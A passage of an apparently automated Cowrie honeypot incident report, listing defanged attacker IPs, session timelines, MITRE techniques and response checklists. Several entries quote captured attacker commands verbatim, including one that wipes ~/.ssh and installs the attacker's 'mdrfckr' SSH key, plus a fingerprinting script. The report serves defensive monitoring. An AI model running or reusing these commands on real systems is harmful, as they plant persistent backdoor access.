**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:10:53` | `cowrie.session.connect` |
| `2026-07-23 17:10:53` | `cowrie.client.version` |
| `2026-07-23 17:10:54` | `cowrie.client.kex` |
| `2026-07-23 17:10:54` | `cowrie.login.success` |
| `2026-07-23 17:10:55` | `cowrie.session.params` |
| `2026-07-23 17:10:55` | `cowrie.command.input` |
| `2026-07-23 17:10:55` | `cowrie.log.closed` |
| `2026-07-23 17:10:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34da1768df22

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]240` |
| **First Seen** | 2026-07-23 17:11 |
| **Last Seen** | 2026-07-23 17:11 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:11:44` | `cowrie.session.connect` |
| `2026-07-23 17:11:45` | `cowrie.client.version` |
| `2026-07-23 17:11:45` | `cowrie.client.kex` |
| `2026-07-23 17:11:47` | `cowrie.login.success` |
| `2026-07-23 17:11:48` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:11:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]240` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]240` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-290b30db1379

| Field | Detail |
|---|---|
| **Source IP** | `200.37.179[.]83` |
| **First Seen** | 2026-07-23 17:11 |
| **Last Seen** | 2026-07-23 17:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:11:53` | `cowrie.session.connect` |
| `2026-07-23 17:11:54` | `cowrie.client.version` |
| `2026-07-23 17:11:54` | `cowrie.client.kex` |
| `2026-07-23 17:11:55` | `cowrie.login.success` |
| `2026-07-23 17:11:55` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:12:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.37.179[.]83` to AbuseIPDB if not already reported
- [ ] Block `200.37.179[.]83` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb6197aadff9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:12 |
| **Last Seen** | 2026-07-23 17:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:12:29` | `cowrie.session.connect` |
| `2026-07-23 17:12:29` | `cowrie.client.version` |
| `2026-07-23 17:12:29` | `cowrie.client.kex` |
| `2026-07-23 17:12:30` | `cowrie.login.success` |
| `2026-07-23 17:12:30` | `cowrie.session.params` |
| `2026-07-23 17:12:30` | `cowrie.command.input` |
| `2026-07-23 17:12:30` | `cowrie.log.closed` |
| `2026-07-23 17:12:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71e08a11bddc

| Field | Detail |
|---|---|
| **Source IP** | `103.93.37[.]178` |
| **First Seen** | 2026-07-23 17:13 |
| **Last Seen** | 2026-07-23 17:14 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:13:51` | `cowrie.session.connect` |
| `2026-07-23 17:13:52` | `cowrie.client.version` |
| `2026-07-23 17:13:52` | `cowrie.client.kex` |
| `2026-07-23 17:13:55` | `cowrie.login.success` |
| `2026-07-23 17:13:56` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:14:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.93.37[.]178` to AbuseIPDB if not already reported
- [ ] Block `103.93.37[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ad064f42156

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:14 |
| **Last Seen** | 2026-07-23 17:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:14:05` | `cowrie.session.connect` |
| `2026-07-23 17:14:05` | `cowrie.client.version` |
| `2026-07-23 17:14:05` | `cowrie.client.kex` |
| `2026-07-23 17:14:05` | `cowrie.login.success` |
| `2026-07-23 17:14:06` | `cowrie.session.params` |
| `2026-07-23 17:14:06` | `cowrie.command.input` |
| `2026-07-23 17:14:06` | `cowrie.log.closed` |
| `2026-07-23 17:14:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3b7a7b94a4c

| Field | Detail |
|---|---|
| **Source IP** | `222.222.124[.]164` |
| **First Seen** | 2026-07-23 17:14 |
| **Last Seen** | 2026-07-23 17:14 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:14:08` | `cowrie.session.connect` |
| `2026-07-23 17:14:09` | `cowrie.client.version` |
| `2026-07-23 17:14:09` | `cowrie.client.kex` |
| `2026-07-23 17:14:12` | `cowrie.login.success` |
| `2026-07-23 17:14:12` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.222.124[.]164` to AbuseIPDB if not already reported
- [ ] Block `222.222.124[.]164` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4269b62bb488

| Field | Detail |
|---|---|
| **Source IP** | `125.69.76[.]148` |
| **First Seen** | 2026-07-23 17:14 |
| **Last Seen** | 2026-07-23 17:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:14:58` | `cowrie.session.connect` |
| `2026-07-23 17:14:58` | `cowrie.client.version` |
| `2026-07-23 17:14:58` | `cowrie.client.kex` |
| `2026-07-23 17:15:00` | `cowrie.login.success` |
| `2026-07-23 17:15:01` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:15:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.69.76[.]148` to AbuseIPDB if not already reported
- [ ] Block `125.69.76[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffd1c86e1a25

| Field | Detail |
|---|---|
| **Source IP** | `65.20.204[.]88` |
| **First Seen** | 2026-07-23 17:15 |
| **Last Seen** | 2026-07-23 17:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:15:07` | `cowrie.session.connect` |
| `2026-07-23 17:15:07` | `cowrie.client.version` |
| `2026-07-23 17:15:07` | `cowrie.client.kex` |
| `2026-07-23 17:15:08` | `cowrie.login.success` |
| `2026-07-23 17:15:08` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.204[.]88` to AbuseIPDB if not already reported
- [ ] Block `65.20.204[.]88` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c0c79d1ebb9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:15 |
| **Last Seen** | 2026-07-23 17:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:15:43` | `cowrie.session.connect` |
| `2026-07-23 17:15:43` | `cowrie.client.version` |
| `2026-07-23 17:15:43` | `cowrie.client.kex` |
| `2026-07-23 17:15:44` | `cowrie.login.success` |
| `2026-07-23 17:15:44` | `cowrie.session.params` |
| `2026-07-23 17:15:44` | `cowrie.command.input` |
| `2026-07-23 17:15:45` | `cowrie.log.closed` |
| `2026-07-23 17:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b04d67b26a6a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:17 |
| **Last Seen** | 2026-07-23 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:17:24` | `cowrie.session.connect` |
| `2026-07-23 17:17:24` | `cowrie.client.version` |
| `2026-07-23 17:17:24` | `cowrie.client.kex` |
| `2026-07-23 17:17:24` | `cowrie.login.success` |
| `2026-07-23 17:17:25` | `cowrie.session.params` |
| `2026-07-23 17:17:25` | `cowrie.command.input` |
| `2026-07-23 17:17:25` | `cowrie.log.closed` |
| `2026-07-23 17:17:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e4db46fa0ce

| Field | Detail |
|---|---|
| **Source IP** | `14.49.140[.]89` |
| **First Seen** | 2026-07-23 17:17 |
| **Last Seen** | 2026-07-23 17:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:17:47` | `cowrie.session.connect` |
| `2026-07-23 17:17:48` | `cowrie.client.version` |
| `2026-07-23 17:17:48` | `cowrie.client.kex` |
| `2026-07-23 17:17:50` | `cowrie.login.success` |
| `2026-07-23 17:17:50` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.49.140[.]89` to AbuseIPDB if not already reported
- [ ] Block `14.49.140[.]89` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97441a00fc7d

| Field | Detail |
|---|---|
| **Source IP** | `203.92.36[.]109` |
| **First Seen** | 2026-07-23 17:17 |
| **Last Seen** | 2026-07-23 17:18 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:17:56` | `cowrie.session.connect` |
| `2026-07-23 17:17:56` | `cowrie.client.version` |
| `2026-07-23 17:17:56` | `cowrie.client.kex` |
| `2026-07-23 17:17:58` | `cowrie.login.success` |
| `2026-07-23 17:17:59` | `cowrie.direct-tcpip.request` |
| `2026-07-23 17:18:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.92.36[.]109` to AbuseIPDB if not already reported
- [ ] Block `203.92.36[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-babd9745aa06

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:19 |
| **Last Seen** | 2026-07-23 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:19:08` | `cowrie.session.connect` |
| `2026-07-23 17:19:08` | `cowrie.client.version` |
| `2026-07-23 17:19:08` | `cowrie.client.kex` |
| `2026-07-23 17:19:08` | `cowrie.login.success` |
| `2026-07-23 17:19:09` | `cowrie.session.params` |
| `2026-07-23 17:19:09` | `cowrie.command.input` |
| `2026-07-23 17:19:10` | `cowrie.log.closed` |
| `2026-07-23 17:19:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5c0d79695d9

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:20 |
| **Last Seen** | 2026-07-23 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:20:45` | `cowrie.session.connect` |
| `2026-07-23 17:20:45` | `cowrie.client.version` |
| `2026-07-23 17:20:45` | `cowrie.client.kex` |
| `2026-07-23 17:20:45` | `cowrie.login.success` |
| `2026-07-23 17:20:46` | `cowrie.session.params` |
| `2026-07-23 17:20:46` | `cowrie.command.input` |
| `2026-07-23 17:20:46` | `cowrie.log.closed` |
| `2026-07-23 17:20:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e320c5170c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:22 |
| **Last Seen** | 2026-07-23 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:22:17` | `cowrie.session.connect` |
| `2026-07-23 17:22:17` | `cowrie.client.version` |
| `2026-07-23 17:22:17` | `cowrie.client.kex` |
| `2026-07-23 17:22:18` | `cowrie.login.success` |
| `2026-07-23 17:22:19` | `cowrie.session.params` |
| `2026-07-23 17:22:19` | `cowrie.command.input` |
| `2026-07-23 17:22:19` | `cowrie.log.closed` |
| `2026-07-23 17:22:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cc0ef3e06d6

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:23 |
| **Last Seen** | 2026-07-23 17:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:23:52` | `cowrie.session.connect` |
| `2026-07-23 17:23:52` | `cowrie.client.version` |
| `2026-07-23 17:23:52` | `cowrie.client.kex` |
| `2026-07-23 17:23:52` | `cowrie.login.success` |
| `2026-07-23 17:23:53` | `cowrie.session.params` |
| `2026-07-23 17:23:53` | `cowrie.command.input` |
| `2026-07-23 17:23:53` | `cowrie.log.closed` |
| `2026-07-23 17:23:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa96f0a6a7c7

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]238` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:29` | `cowrie.session.connect` |
| `2026-07-23 17:25:29` | `cowrie.client.version` |
| `2026-07-23 17:25:29` | `cowrie.client.kex` |
| `2026-07-23 17:25:29` | `cowrie.login.success` |
| `2026-07-23 17:25:30` | `cowrie.session.params` |
| `2026-07-23 17:25:30` | `cowrie.command.input` |
| `2026-07-23 17:25:30` | `cowrie.log.closed` |
| `2026-07-23 17:25:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]238` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b73f0ad2c6c

| Field | Detail |
|---|---|
| **Source IP** | `120.28.109[.]188` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:37` | `cowrie.session.connect` |
| `2026-07-23 17:25:37` | `cowrie.client.version` |
| `2026-07-23 17:25:37` | `cowrie.client.kex` |
| `2026-07-23 17:25:38` | `cowrie.login.success` |
| `2026-07-23 17:25:39` | `cowrie.session.params` |
| `2026-07-23 17:25:39` | `cowrie.command.input` |
| `2026-07-23 17:25:39` | `cowrie.command.failed` |
| `2026-07-23 17:25:40` | `cowrie.log.closed` |
| `2026-07-23 17:25:41` | `cowrie.session.params` |
| `2026-07-23 17:25:41` | `cowrie.command.input` |
| `2026-07-23 17:25:41` | `cowrie.session.file_download` |
| `2026-07-23 17:25:41` | `cowrie.log.closed` |
| `2026-07-23 17:25:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.28.109[.]188` to AbuseIPDB if not already reported
- [ ] Block `120.28.109[.]188` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83c6ad901e12

| Field | Detail |
|---|---|
| **Source IP** | `103.56.115[.]187` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:41` | `cowrie.session.connect` |
| `2026-07-23 17:25:41` | `cowrie.client.version` |
| `2026-07-23 17:25:41` | `cowrie.client.kex` |
| `2026-07-23 17:25:41` | `cowrie.login.success` |
| `2026-07-23 17:25:42` | `cowrie.session.params` |
| `2026-07-23 17:25:42` | `cowrie.command.input` |
| `2026-07-23 17:25:42` | `cowrie.command.failed` |
| `2026-07-23 17:25:43` | `cowrie.log.closed` |
| `2026-07-23 17:25:43` | `cowrie.session.params` |
| `2026-07-23 17:25:43` | `cowrie.command.input` |
| `2026-07-23 17:25:44` | `cowrie.session.file_download` |
| `2026-07-23 17:25:44` | `cowrie.log.closed` |
| `2026-07-23 17:25:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.56.115[.]187` to AbuseIPDB if not already reported
- [ ] Block `103.56.115[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e7e1c6043b7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]49` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:41` | `cowrie.session.connect` |
| `2026-07-23 17:25:42` | `cowrie.client.version` |
| `2026-07-23 17:25:42` | `cowrie.client.kex` |
| `2026-07-23 17:25:46` | `cowrie.login.success` |
| `2026-07-23 17:25:47` | `cowrie.session.params` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.success` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:47` | `cowrie.command.input` |
| `2026-07-23 17:25:48` | `cowrie.log.closed` |
| `2026-07-23 17:25:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]49` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b91d2e0e0a74

| Field | Detail |
|---|---|
| **Source IP** | `120.28.109[.]188` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:41` | `cowrie.session.connect` |
| `2026-07-23 17:25:41` | `cowrie.client.version` |
| `2026-07-23 17:25:41` | `cowrie.client.kex` |
| `2026-07-23 17:25:43` | `cowrie.login.success` |
| `2026-07-23 17:25:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.28.109[.]188` to AbuseIPDB if not already reported
- [ ] Block `120.28.109[.]188` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d160477e644e

| Field | Detail |
|---|---|
| **Source IP** | `120.28.109[.]188` |
| **First Seen** | 2026-07-23 17:25 |
| **Last Seen** | 2026-07-23 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 17:25:43` | `cowrie.session.connect` |
| `2026-07-23 17:25:43` | `cowrie.client.version` |
| `2026-07-23 17:25:44` | `cowrie.client.kex` |
| `2026-07-23 17:25:45` | `cowrie.login.success` |
